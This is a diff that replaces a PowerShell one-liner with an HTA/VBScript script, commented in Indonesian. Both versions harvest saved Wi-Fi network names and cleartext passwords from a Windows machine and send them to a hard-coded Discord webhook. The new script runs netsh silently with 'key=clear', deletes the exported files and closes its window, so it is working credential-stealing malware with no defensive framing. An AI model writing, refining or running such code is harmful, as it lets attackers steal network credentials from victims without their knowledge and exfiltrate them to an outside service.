@@ -1,1 +1,54 @@
-$d = Get-ChildItem (Join-Path $env:temp 'Wi*.xml') | ForEach-Object { [xml]$x = Get-Content $_.FullName; [PSCustomObject]@{ SSID = $x.WLANProfile.name; Pass = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial } }; if ($d) { Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body (ConvertTo-Json @{ content = ($d | Out-String) }) -ContentType 'application/json' -UseBasicParsing }
+<script language="VBScript">
+    Set wsh = CreateObject("WScript.Shell")
+    temp = wsh.ExpandEnvironmentStrings("%TEMP%")
+    
+    ' 1. Ekspor profil Wi-Fi menggunakan CMD standar (Bukan PowerShell)
+    wsh.Run "cmd.exe /c cd " & temp & " && netsh wlan export profile key=clear", 0, True
+    
+    ' 2. Membaca file XML dan mencari password menggunakan FileSystemObject
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set folder = fso.GetFolder(temp)
+    report = "--- SYSTEM WI-FI REPORT ---" & vbCrLf
+    
+    For Each file In folder.Files
+        If InStr(file.Name, "Wi-Fi-") > 0 And Right(file.Name, 4) = ".xml" Then
+            Set txtFile = fso.OpenTextFile(file.Path, 1)
+            content = txtFile.ReadAll
+            txtFile.Close
+            
+            ' Ekstraksi SSID
+            ssid = ""
+            p1 = InStr(content, "<name>")
+            If p1 > 0 Then
+                p2 = InStr(p1, content, "</name>")
+                ssid = Mid(content, p1 + 6, p2 - p1 - 6)
+            End If
+            
+            ' Ekstraksi Password (keyMaterial)
+            pass = ""
+            k1 = InStr(content, "<keyMaterial>")
+            If k1 > 0 Then
+                k2 = InStr(k1, content, "</keyMaterial>")
+                pass = Mid(content, k1 + 13, k2 - k1 - 13)
+            End If
+            
+            If ssid <> "" Then
+                report = report & "SSID: " & ssid & " | Pass: " & pass & vbCrLf
+            End If
+            fso.DeleteFile(file.Path), True
+        End If
+    Next
+    
+    ' 3. Mengirimkan data teks ke Discord Webhook via HTTP POST
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    url = "https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda"
+    
+    ' Format payload JSON Discord
+    json = "{""content"":""" & Replace(report, vbCrLf, "\n") & """}"
+    
+    http.Open "POST", url, False
+    http.SetRequestHeader "Content-Type", "application/json"
+    http.Send json
+    
+    window.close
+</script>
